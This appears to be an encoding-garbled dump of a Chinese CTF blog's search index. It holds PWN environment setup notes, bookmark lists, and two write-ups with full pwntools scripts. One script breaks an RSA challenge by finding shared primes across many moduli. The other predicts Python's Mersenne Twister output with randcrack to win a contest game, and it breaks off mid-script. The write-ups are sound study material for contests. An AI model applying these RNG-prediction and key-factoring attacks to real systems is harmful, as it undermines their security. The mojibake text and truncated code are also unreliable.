é€‰æ‹©æ–‡æœ¬æ—¶åŒæ—¶å°†æ•°æ®æ‹·è´åˆ°å‰ªåˆ‡æ¿ä¸­ show_titlebar = False # ä¸æ˜¾ç¤ºæ ‡é¢˜æ ï¼Œä¹Ÿå°±æ˜¯ terminator ä¸­é‚£ä¸ªé»˜è®¤çš„çº¢è‰²çš„æ ‡é¢˜æ  [layouts] [[default]] [[[child1]]] type = Terminal parent = window0 profile = default [[[window0]]] type = Window parent = \u0026#34;\u0026#34; [plugins] ç¤ºä¾‹1æˆªå›¾ï¼šï¼ˆä¹Ÿæ˜¯æˆ‘è‡ªå·±çš„æ¡Œé¢ï¼‰\nèƒŒæ™¯å›¾ç‰‡ï¼ˆå¯èƒ½åŠ è½½æœ‰ç‚¹æ…¢ï¼‰ï¼š\nå‚è€ƒé“¾æ¥ï¼š\nUbuntuä¸­ç»ˆç«¯åˆ†å±å·¥å…·terminatorçš„å®‰è£…å’Œä½¿ç”¨\nTerminatorçš„å®‰è£…å’Œé…ç½®(é¢œè‰²å’Œå­—ä½“)\nterminatorå®‰è£…ã€ç¾åŒ–ã€ä½¿ç”¨åŠé—ªé€€è§£å†³\nTerminatorç»ˆç«¯çš„å®‰è£…ï¼Œé…ç½®ä»¥åŠå¦‚ä½•ä¿®æ”¹é»˜è®¤ç»ˆç«¯\né™„å½• # æœ¬æ–‡å…¶ä»–çš„å‚è€ƒé“¾æ¥åŠæ¨èé˜…è¯»ï¼š\nubuntu20.04 PWNï¼ˆå«x86ã€ARMã€MIPSï¼‰ç¯å¢ƒæ­å»º\nUbuntu22.04æ­å»ºPWNç¯å¢ƒ\npwnåŸºç¡€ PWNç¯å¢ƒæ­å»º\n","date":"July 10, 2023","permalink":"/posts/pwn/basic/pwn-_environment/","section":"Posts","summary":"å‰è¨€ # å­¦ä¹ pwnå·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä½†æ˜¯ç”±äºä¹‹å‰è‡ªå·±ä¸€ç›´æ²¡æœ‰æ³¨","title":"PWNç¯å¢ƒæ­å»ºè®°å½•-Ubuntu 22.04"},{"content":"","date":"July 10, 2023","permalink":"/categories/pwn%E5%85%A5%E9%97%A8/","section":"Categories","summary":"","title":"pwnå…¥é—¨"},{"content":" miscå­¦ä¹  # æ‚é¡¹ç®€ä»‹ - CTF Wiki CTFâ€”â€”miscæŒ‡å—ã€é•¿æœŸæ›´æ–°ã€‘ #å¸ˆå‚…æ€»ç»“å¾—éå¸¸å¥½ï¼Œæˆ‘å“­æ­»ï¼Œæ„Ÿè§‰æˆ‘çš„miscæœ‰æ•‘äº†ğŸ™\nCTF miscå›¾ç‰‡ç±»æ€»ç»“ï¼ˆå…¥é—¨çº§ï¼‰ #æ€•è‡ªå·±å¤ªä¹…æ²¡åšå¿˜è®°äº†ï¼Œæ”¾åœ¨è¿™é˜²å¿˜è®°\nç¼–ç ä¸è§£ç ç›¸å…³å·¥å…· # base64è§£ç  base64ç¼–ç  #ç”¨èµ·æ¥ä¸€èˆ¬èˆ¬\nCipher Identifier #æ¯”è¾ƒå¥½çš„å¤å…¸å¯†ç å­¦è§£å¯†å·¥å…·ï¼Œå¯ä»¥åˆ†æå¯†æ–‡çš„åŠ å¯†æ–¹å¼\nå…½éŸ³è¯‘è€…åœ¨çº¿ç¼–ç è§£ç  - å…½éŸ³ç¿»è¯‘å’†å“®ä½“åŠ å¯†è§£å¯† #å¥‡æ€ªçš„ç¼–ç æ–¹å¼å¢åŠ äº†\nå…¶ä»–å·¥å…· # å›¾ç‰‡æ–‡å­—è¯†åˆ«ï¼ˆæœ‰é“ï¼‰ #æœ‰æ—¶å€™flagæˆ–è€…å¯†æ–‡åœ¨ä¸€å¼ å›¾ç‰‡ä¸Š\nå›¾ç‰‡è½¬æ–‡å­—åœ¨çº¿ ï¼ˆç™½æï¼‰ #è€Œä¸”è¿˜è¦ä½ æ‰‹æ‰“çš„æ—¶å€™å°±å¯ä»¥ç”¨ä¸Šäº†\nOSINT å­¦ä¹  # (3æ¡æ¶ˆæ¯) ctfèœç‹—æ¯OSINT wp #å¸ˆå‚…çš„wpï¼Œè¶…å¤šç¤¾å·¥é¢˜\n","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/misc%E4%B9%A6%E7%AD%BE/","section":"Pointers","summary":"miscå­¦ä¹  # æ‚é¡¹ç®€ä»‹ - CTF Wiki CTFâ€”â€”miscæŒ‡å—ã€é•¿æœŸæ›´æ–°","title":"miscç›¸å…³-ä¹¦ç­¾"},{"content":" å †å›é¡¾ä¸å†å­¦ä¹  # å †æº¢å‡º_hollkçš„åšå®¢-CSDNåšå®¢\nåŸºç¡€çŸ¥è¯†å¤ä¹  # pwntools â€” pwntools 4.10.0 documentation\nPWNå­¦ä¹ æ€»ç»“ï¼ˆä¸æ–­å®Œå–„ä¸­ï¼‰\nè¶…å…¨PWNå…¥é—¨ç¬”è®°ï¼Œä»æ ˆåˆ°å †ä¸€æ­¥åˆ°ä½ ","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/pwn%E4%B9%A6%E7%AD%BE/","section":"Pointers","summary":"å †å›é¡¾ä¸å†å­¦ä¹  # å †æº¢å‡º_hollkçš„åšå®¢-CSDNåšå®¢ åŸºç¡€çŸ¥","title":"pwnå­¦ä¹ -ä¹¦ç­¾"},{"content":"å‰æ’æé†’ï¼š\nè¯¥æ–‡ç« ä¸­çš„å·¥å…·éƒ½æ²¡ä»€ä¹ˆå¤§ç”¨ï¼Œè·¯è¿‡çš„å¸ˆå‚…ä»¬å¯ä»¥ç›´æ¥å‰å¾€ä¸‹ä¸€ç¯‡æ–‡ç« ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\nä»¥ä¸‹ä¸ºæ²¡ä»€ä¹ˆå¤§ç”¨çš„å·¥å…·ç½‘ç«™çš„é“¾æ¥ï¼š\nmdæ–‡æ¡£ emoji è¡¨æƒ…çŸ­ä»£ç  #å†™æ–‡ç« å¸¸ç”¨emojiå¿…å¤‡\nRGBé¢œè‰²å€¼ä¸åå…­è¿›åˆ¶é¢œè‰²ç è½¬æ¢å·¥å…· #è™½ç„¶æ²¡å¤§ç”¨\nå›¾ç‰‡æ–‡å­—è¯†åˆ« #æœ‰æ—¶å€™flagæˆ–è€…å¯†æ–‡åœ¨ä¸€å¼ å›¾ç‰‡ä¸Šè¿˜è¦ä½ æ‰‹æ‰“çš„æ—¶å€™å°±å¯ä»¥ç”¨ä¸Šäº†\nSearch Icons #æŸ¥æ‰¾iconå›¾ç‰‡çš„ç½‘ç«™\nåœ¨å›¾åƒä¸­è£å‰ªåœ†å½¢\n","date":"July 6, 2023","permalink":"/pointer/%E4%B9%A6%E7%AD%BE/%E5%B7%A5%E5%85%B7%E7%BD%91%E5%9D%80/","section":"Pointers","summary":"å‰æ’æé†’ï¼š è¯¥æ–‡ç« ä¸­çš„å·¥å…·éƒ½æ²¡ä»€ä¹ˆå¤§ç”¨ï¼Œè·¯è¿‡çš„å¸ˆå‚…ä»¬å¯ä»¥ç›´æ¥å‰","title":"ä¸€äº›æ²¡ä»€ä¹ˆå¤§ç”¨çš„å·¥å…·çš„é“¾æ¥"},{"content":"","date":"July 5, 2023","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\ré¢˜ç›®æè¿° # åœ¨RSAä¸­ï¼Œç´ æ•°çš„é€‰æ‹©å’Œä¿å¯†æ€§éå¸¸é‡è¦ã€‚\nåªè¦ä¸æ³„éœ²nçš„åˆ†è§£ï¼Œé‚£RSAå°±æ˜¯å®‰å…¨çš„ã€‚\n**hint ï¼š**GZçš„è„‘å®¹é‡æœ‰é™ï¼Œå­˜ä¸ä¸‹å¤ªå¤šçš„è´¨æ•°\nåˆ†æä¸è§£é¢˜è„šæœ¬ # hint æç¤ºä¸ºï¼šGZ çš„è„‘å®¹é‡æœ‰é™ï¼Œå­˜ä¸ä¸‹å¤ªå¤šçš„è´¨æ•°ï¼Œ æ‰€ä»¥å¯ä»¥æ¨æµ‹å‡ºåœ¨ç”Ÿæˆçš„è¶³å¤Ÿå¤šä¸ª n ä¸­ä¼šæœ‰ä¸¤ä¸ª n æœ‰å…¬çº¦æ•°ï¼Œè€Œæ±‚å…¬çº¦æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨gmpy2.gcd()å‡½æ•°å—æ•°æ±‚å‡ºã€‚ Pythonè„šæœ¬å¦‚ä¸‹ï¼š\nfrom pwn import* import os from Crypto.Util.number import * import gmpy2 import binascii def Decrypt(c, e, p, n): q = n//p L = (p - 1) * (q - 1) d = gmpy2.invert(e, L) m = gmpy2.powmod(c, d, n) #å¾—åˆ°å¯†æ–‡ m flag2 = hex(m) flag1 = str(flag2[2:]) flag = binascii.unhexlify(flag1) print(flag.decode(\u0026#39;utf-8\u0026#39;)) #æ‰“å°flag n = list(range(101)) e = list(range(101)) c = list(range(101)) num = 50 for i in range(num): #å­¦ä¼šä½¿ç”¨try: except: æ¥å¤šæ¬¡è¿æ¥æ–­å¼€å¾—åˆ°æ•°æ® try: taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39227) taolve.recvuntil(b\u0026#34;n = \u0026#34;) n[i] = int(taolve.recvuntil(b\u0026#34;\\ne = \u0026#34;, drop=True)) e[i] = int(taolve.recvuntil(b\u0026#34;\\nc = \u0026#34;, drop=True)) c[i] = int(taolve.recvuntil(b\u0026#34;\\n\u0026#34;, drop=True)) except: taolve.close() print(\u0026#34;=============next step====================\u0026#34;) for i in range(num-1): for j in range(k): if i==j: continue p = gmpy2.gcd(n[i], n[j]) if p \u0026gt; 1 : #print(i, j) print(\u0026#34;p = \u0026#34;, p) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) Decrypt(c[i], e[i], p, n[i]) Decrypt(c[j], e[j], p, n[j]) q1 = n[i] // p q2 = n[j] // p if p*q1 == n[i] and p*q2 == n[j]: print(\u0026#34;q1 = \u0026#34;, q1) print(\u0026#34;q2 = \u0026#34;, q2) print(\u0026#34;n1 = \u0026#34;, n[i]) print(\u0026#34;n2 = \u0026#34;, n[j]) print(\u0026#34;e1 = \u0026#34;, e[i]) print(\u0026#34;e2 = \u0026#34;, e[j]) print(\u0026#34;c1 = \u0026#34;, c[i]) print(\u0026#34;c2 = \u0026#34;, c[j]) else : print(p,end=\u0026#34;\u0026#34;) #ç”¨1æ¥æ ‡è®°æ²¡æœ‰ç»“æœçš„å°è¯• è¾“å‡ºç»“æœï¼š\nW4terCTF{1T_ls_dang3ROus_7O_US3_A_pRlM3_TwlCe!!!!!!!}\nå®æˆ˜æˆªå›¾ï¼š ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/6_gz-rsa_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"Crypto-GZ RSA"},{"content":"","date":"July 5, 2023","permalink":"/tags/misc/","section":"Tags","summary":"","title":"misc"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\r0.é¢˜ç›®æè¿° # æ®è¯´æ³·å¥ˆæ‹¿åˆ°äº†æ–°æƒ…æŠ¥ï¼Ÿ\nèƒ½ä¸èƒ½å‡è£…åƒæŸå°†æƒ…æŠ¥éª—åˆ°æ‰‹å°±é ä½ äº†ï¼\n#ä¸‹è½½é¢˜ç›®é™„ä»¶åå¾—åˆ°main.pyï¼š import os import random from hashlib import md5 random.seed(os.urandom(64)) æƒ…æŠ¥ = os.environ[\u0026#39;GZCTF_FLAG\u0026#39;] V åº•çº¿ = 512 çŸ³å¤´å‰ªåˆ€å¸ƒæ˜ å°„ = [\u0026#34;çŸ³å¤´\u0026#34;, \u0026#34;å‰ªåˆ€\u0026#34;, \u0026#34;å¸ƒ\u0026#34;] def çŸ³å¤´å‰ªåˆ€å¸ƒ(): éšæœºæ•° = random.getrandbits(32) #éšæœºæ•° = 1 çŒœæ‹³ = çŸ³å¤´å‰ªåˆ€å¸ƒæ˜ å°„[éšæœºæ•° % 3] è½®å“ˆå¸Œ = int(md5(str(éšæœºæ•° % 3).encode()).hexdigest()[4:12], 16) è½®æ ‡è¯†ç¬¦ = (éšæœºæ•° // 3) ^ è½®å“ˆå¸Œ return hex(è½®æ ‡è¯†ç¬¦)[2:].zfill(8), çŒœæ‹³ def æ£€æŸ¥(çŒœæ‹³, è¾“å…¥): return çŒœæ‹³ == \u0026#34;çŸ³å¤´\u0026#34; and è¾“å…¥ == \u0026#34;å¸ƒ\u0026#34; or \\ çŒœæ‹³ == \u0026#34;å‰ªåˆ€\u0026#34; and è¾“å…¥ == \u0026#34;çŸ³å¤´\u0026#34; or \\ çŒœæ‹³ == \u0026#34;å¸ƒ\u0026#34; and è¾“å…¥ == \u0026#34;å‰ªåˆ€\u0026#34; def ç©(æ¨¡å¼): print(\u0026#39;- å¼€å§‹äº†å“¦ï¼ï¼ˆå¹³å±€ä¹Ÿç®—ä½ è¾“å“¦ï¼‰\u0026#39;) è½® = 0 while è½® \u0026lt; åº•çº¿: è½® += 1 è½®æ ‡è¯†ç¬¦, çŒœæ‹³ = çŸ³å¤´å‰ªåˆ€å¸ƒ() print(f\u0026#39;\\nRound {è½®}: #{è½®æ ‡è¯†ç¬¦}\u0026#39;) print(\u0026#34;- æˆ‘å‡†å¤‡å¥½äº†\u0026#34;) while True: è¾“å…¥ = input(\u0026#34;- çŸ³å¤´å‰ªåˆ€å¸ƒï¼ï¼Œæˆ‘å‡º \u0026gt; \u0026#34;).strip() if è¾“å…¥ in [\u0026#34;çŸ³å¤´\u0026#34;, \u0026#34;å‰ªåˆ€\u0026#34;, \u0026#34;å¸ƒ\u0026#34;]: print(f\u0026#34;- æˆ‘å‡ºçš„æ˜¯ {çŒœæ‹³}\u0026#34;) break print(\u0026#34;- å¹²å˜›å‘¢ï¼Œå‡º çŸ³å¤´/å‰ªåˆ€/å¸ƒ å•Š\u0026#34;) ç»“æœ = æ£€æŸ¥(çŒœæ‹³, è¾“å…¥) print(\u0026#34;- ä½ èµ¢äº†\u0026#34; if ç»“æœ else \u0026#34;- ä½ è¾“äº†\u0026#34;) if æ¨¡å¼ == 1 and not ç»“æœ: print(\u0026#34;ä½ æ‰ä¸æ˜¯çœŸçš„åƒæŸï¼ä½ ä¸ªåè›‹ï¼ï¼\u0026#34;) return è½® - 1 return åº•çº¿ def é€‰æ‹©æ¨¡å¼(): print(\u0026#39;è¯·é€‰æ‹©æ¨¡å¼:\u0026#39;) print(\u0026#39;0: é€‚åº”æ¨¡å¼ï¼ˆè¾“äº†ä¸ä¼šæ€ªä½ å“¦ï¼‰\u0026#39;) print(\u0026#39;1: è®¤çœŸæ¨¡å¼\u0026#39;) æ¨¡å¼ = int(input(\u0026#39;\u0026gt; \u0026#39;)) assert 0 \u0026lt;= æ¨¡å¼ \u0026lt;= 1 return æ¨¡å¼ if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;äº•ä¹‹ä¸Šæ³·å¥ˆå‡ºç°åœ¨äº†ä½ é¢å‰â€¦â€¦\\n\u0026#39;) print(\u0026#39;- æƒ³è¦æˆ‘å¾—åˆ°çš„æƒ…æŠ¥ï¼Ÿ\u0026#39;) print(\u0026#39;- å—¯å—¯\u0026#39;) print(\u0026#39;- ä½ çœŸçš„æ˜¯åƒæŸå—â€¦â€¦ï¼Ÿ\u0026#39;) print(\u0026#39;- æ˜¯çš„å‘€\u0026#39;) print(\u0026#39;- åœ¨çŸ³å¤´å‰ªåˆ€å¸ƒä¸­ï¼Œåªè¦æˆ‘ä¸ä½¿ç”¨ç‰¹æ®Šæ‰‹æ®µï¼ŒåƒæŸä¸€å®šä¼š 100% èµ¢æˆ‘ï¼Œå°±ç”¨è¿™ä¸ªæ¥éªŒè¯ä½ çš„èº«ä»½å§ï¼\u0026#39;) print(\u0026#39;- è¯¶å¤šï¼Œè¿™ä¸ªå˜›â€¦â€¦\\n\u0026#39;) try: while True: æ¨¡å¼ = é€‰æ‹©æ¨¡å¼() ç»ˆ = ç©(æ¨¡å¼) if æ¨¡å¼ == 0: print(\u0026#39;- å¯ä»¥å¼€å§‹äº†å—ï¼Ÿ\u0026#39;) continue if not ç»ˆ \u0026lt; åº•çº¿: print(\u0026#39;- ä½ â€¦â€¦çœŸçš„æ˜¯åƒæŸï¼\\n\u0026#39;) print(f\u0026#39;é‚£å°±ç»™ä½ æƒ…æŠ¥å§: {æƒ…æŠ¥}\u0026#39;) break except: print(\u0026#39;- ä½ æ˜¯ä¸æ˜¯åœ¨æä»€ä¹ˆé¬¼å•Šï¼\u0026#39;) exit(0) 1.åˆ†æä¼ªéšæœºæ•°æ¼æ´ï¼š # åˆ†æä¸€ä¸‹ç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°æ³·å¥ˆå‡ºæ‹³æ˜¯ç”±éšæœºæ•°ç”Ÿæˆå‡½æ•°random.getrandbits(32)å†³å®šçš„ï¼Œæœç´¢ç›¸å…³èµ„æ–™ä¼šå‘ç°ï¼Œè¿™ä¸ªå‡½æ•°æ‰€ä½¿ç”¨çš„æ˜¯æ¢…æ£®ç®—æ³•MT19937ï¼Œè™½ç„¶èƒ½å¤Ÿäº§ç”Ÿä¼˜ç§€çš„ä¼ªéšæœºæ•°ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæ¼æ´ï¼šå…¶ç”Ÿæˆçš„æ•°æ®åœ¨62432ï¼ˆ62332=19936ï¼‰åä¼šè¾¾åˆ°å¾ªç¯ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬çŸ¥é“äº†åœ¨åŒä¸€ä¸ªç¨‹åºä¸­ç”Ÿæˆçš„å‰624ä¸ªç”±æ¢…æ£®ç®—æ³•äº§ç”Ÿçš„32ä½éšæœºæ•°ï¼Œå°±èƒ½å¤Ÿé¢„æµ‹ä¸‹ä¸€ä¸ªäº§ç”Ÿçš„éšæœºæ•°ã€‚\n2.å¦‚ä½•å®ç°é¢„æµ‹ï¼Ÿ # é¢„æµ‹ä¼ªéšæœºæ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨randcrackåº“ çš„Pythonåº“è¿›è¡Œé¢„æµ‹ï¼š\nå®‰è£… pip install randcrack -i https://pypi.tuna.tsinghua.edu.cn/simple ç”¨æ³• import random #å¯¼å…¥randomåº“ï¼ˆPythonå†…ç½®äº†ï¼‰ from randcrack import RandCrack #ä¸‹è½½randcrackåº“åå¯¼å…¥ç±» #ä½ å¯ä»¥æ·éšæœºæ•°ç§å­æ¥ç¡®ä¿é¢„æµ‹çš„æœ‰æ•ˆæ€§ï¼Œ #ä¸è¿‡randomé¢„æµ‹çš„æ—¶å€™é»˜è®¤ä»¥å½“å‰æ—¶é—´ä½œä¸ºéšæœºæ•°ç§å­ rc = RandCrack()#å®ä¾‹åŒ–randcrackç±» for i in range(624):#å¾ªç¯624æ¬¡ rc.submit(random.getrandbits(32)) #æ¯æ¬¡å¾ªç¯æäº¤ä¸€ä¸ª32ä½randomç”Ÿæˆçš„éšæœºæ•° print(random.getrandbits(32)) #åˆ©ç”¨randomåº“è·å–ä¸€ä¸ª32ä½çš„éšæœºæ•°ï¼ˆä½ å¯ä»¥ä¿®æ”¹ä¸ºä»»æ„ä½æ•°ï¼Œæ¯”å¦‚64ä½ï¼‰ print(rc.predict_getrandbits(32)) #åˆ©ç”¨randcrackè·å–çš„éšæœºæ•° åˆ†æä¸€ä¸‹mainå‡½æ•°ä»£ç çš„é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°é€‰æ‹©æ¨¡å¼å‡½æ•°ä¸­å¯ä»¥é€‰æ‹©é€‚åº”æ¨¡å¼ä¸è®¤çœŸæ¨¡å¼ï¼Œè€Œä¸”é€‚åº”æ¨¡å¼å¯ä»¥è¿›è¡Œå¤šæ¬¡è€Œä¸é€€å‡ºç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œè¿›è¡Œä¸¤æ¬¡é€‚åº”æ¨¡å¼ï¼Œå¹¶ä¸”ç®—å‡ºæ³·å¥ˆçš„å‰624æ¬¡å‡ºæ‹³æ—¶äº§ç”Ÿçš„éšæœºæ•°ï¼Œå†åˆ©ç”¨randcrack çš„Pythonåº“è¿›è¡Œé¢„æµ‹ã€‚ åˆ†æä»£ç ä¸­çš„ çŸ³å¤´å‰ªåˆ€å¸ƒ()å‡½æ•° æˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚ä½•ç®—å‡ºæ³·å¥ˆå‡ºæ‹³æ—¶äº§ç”Ÿçš„éšæœºæ•°ï¼š\næˆ‘ä»¬å·²çŸ¥ï¼š 1.æ³·å¥ˆå‡ºçš„æ˜¯çŸ³å¤´è¿˜æ˜¯å‰ªåˆ€è¿˜æ˜¯å¸ƒ è®¾ mark= 0 ï¼Œ1 ï¼Œ2 æ¥è¡¨ç¤º 2.çŒœæ‹³çš„è½®æ ‡è¯†ç¬¦ åˆç”± è½®æ ‡è¯†ç¬¦ = (éšæœºæ•° // 3) ^ è½®å“ˆå¸Œ å¯å¾— éšæœºæ•°//3 = è½®æ ‡è¯†ç¬¦ ^ è½®å“ˆå¸Œ 3.å½“æˆ‘ä»¬å·²çŸ¥markçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“è½®å“ˆå¸Œçš„å€¼ for i in range(3): è½®å“ˆå¸Œ = int(md5(str(i).encode()).hexdigest()[4:12], 16) print(è½®å“ˆå¸Œ) è¾“å‡ºç»“æœä¸ºï¼š 545560021 1111007417 1921883468 æˆ‘ä»¬è®¾ï¼š hhh = [545560021, 1111007417, 1921883468] 4.ç”±ä¸Šè¿°å¯å¾—éšæœºæ•°çš„å€¼å¯ä»¥è¿™æ ·æ±‚ï¼š éšæœºæ•°é™¤3 = è½®æ ‡è¯†æ•°å­— ^ hhh[mark] éšæœºæ•° = 3 * éšæœºæ•°é™¤3 + mark å…³äºå¦‚ä½•è‡ªåŠ¨åŒ–è¯†åˆ«æ³·å¥ˆæ€ä¹ˆå‡ºæ‹³ä»¥åŠè‡ªåŠ¨åŒ–é¢„æµ‹ä¸‹ä¸€ä¸ªå‡ºæ‹³å¹¶å–å¾—çŒœæ‹³çš„èƒœåˆ©ï¼Œå°±éœ€è¦ç”¨pythonæ¥å†™ä¸€ä¸ªè„šæœ¬äº†ï¼ˆéœ€è¦ç”¨åˆ°pwntoolsåº“ï¼‰ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š\n# encoding: utf-8 # codingc= unicode from pwn import * import random, time from randcrack import RandCrack import re rc = RandCrack() context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 37069) #taolve æ˜¯æœ¬äººæ›¾ç”¨è¿‡çš„ç”¨æˆ·åï¼Œæ²¡ä»€ä¹ˆç‰¹æ®Šå«ä¹‰ï¼Œ #ä¹Ÿå¯ä»¥éšä¾¿æ”¹ï¼Œä¸€èˆ¬åˆ™ä½¿ç”¨ r=remote()æ¥è¡¨ç¤ºè¿œç¨‹ # çŸ³å¤´å‰ªåˆ€å¸ƒæ˜ å°„ = [\u0026#34;çŸ³å¤´\u0026#34;, \u0026#34;å‰ªåˆ€\u0026#34;, \u0026#34;å¸ƒ\u0026#34;] # ============ç¬¬ä¸€æ¬¡ï¼Œæäº¤å‰512ä¸ªæ•°============== hhh = [545560021, 1111007417, 1921883468] answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å‰ªåˆ€\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;çŸ³å¤´\u0026#34; mark = 0 else: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å¸ƒ\u0026#34; mark = 2 print(åƒæŸå‡ºçš„æ˜¯) éšæœºæ•°é™¤3 = è½®æ ‡è¯†æ•°å­— ^ hhh[mark] éšæœºæ•° = 3 * éšæœºæ•°é™¤3 + mark rc.submit(éšæœºæ•°) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) è½®æ ‡è¯†ç¬¦ = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(è½®æ ‡è¯†ç¬¦) è½®æ ‡è¯†æ•°å­— = int(è½®æ ‡è¯†ç¬¦, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;çŸ³å¤´\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;the last one!!!!!!!!!!\u0026#34;) #ç¬¬ä¸€å±€çŒœæ‹³çš„æœ€åä¸€æ¬¡ answer1 = taolve.recv(15) answer2 = taolve.recv(6) print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å‰ªåˆ€\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;çŸ³å¤´\u0026#34; mark = 0 else: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å¸ƒ\u0026#34; mark = 2 print(åƒæŸå‡ºçš„æ˜¯) éšæœºæ•°é™¤3 = è½®æ ‡è¯†æ•°å­— ^ hhh[mark] éšæœºæ•° = 3 * éšæœºæ•°é™¤3 + mark rc.submit(éšæœºæ•°) # ================ç¬¬äºŒæ¬¡==================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;0\u0026#34;) for i in range(512): if i\u0026lt;113: answer1 = taolve.recv(15) answer2 = taolve.recv(6) if i != 0: print(answer2) if answer2 == b\u0026#34;\\xe5\\x89\\xaa\\xe5\\x88\\x80\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å‰ªåˆ€\u0026#34; mark = 1 elif answer2 == b\u0026#34;\\xe7\\x9f\\xb3\\xe5\\xa4\\xb4\u0026#34;: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;çŸ³å¤´\u0026#34; mark = 0 else: åƒæŸå‡ºçš„æ˜¯ = \u0026#34;å¸ƒ\u0026#34; mark = 2 print(åƒæŸå‡ºçš„æ˜¯) éšæœºæ•°é™¤3 = è½®æ ‡è¯†æ•°å­— ^ hhh[mark] éšæœºæ•° = 3 * éšæœºæ•°é™¤3 + mark rc.submit(éšæœºæ•°) answer3 = taolve.recvuntil(b\u0026#34;: #\u0026#34;) answer4 = answer1 + answer2 + answer3 print(answer4.decode(\u0026#39;utf-8\u0026#39;)) è½®æ ‡è¯†ç¬¦ = taolve.recv(8).decode(\u0026#39;utf-8\u0026#39;) print(è½®æ ‡è¯†ç¬¦) è½®æ ‡è¯†æ•°å­— = int(è½®æ ‡è¯†ç¬¦, 16) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(\u0026#34;çŸ³å¤´\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) else: if i == 113: #æäº¤äº†624ä¸ªéšæœºæ•°äº†ï¼Œæ¥ä¸‹æ¥å¯ä»¥çœ‹çœ‹é¢„æµ‹çš„æ•ˆæœäº† aa = rc.predict_getrandbits(32) éšæœºæ•° = rc.predict_getrandbits(32) mark = éšæœºæ•° % 3 è½®æ ‡è¯†ç¬¦ = (éšæœºæ•° // 3) ^ hhh[mark] print(\u0026#34;é¢„æµ‹ï¼š\u0026#34;) print(hex(è½®æ 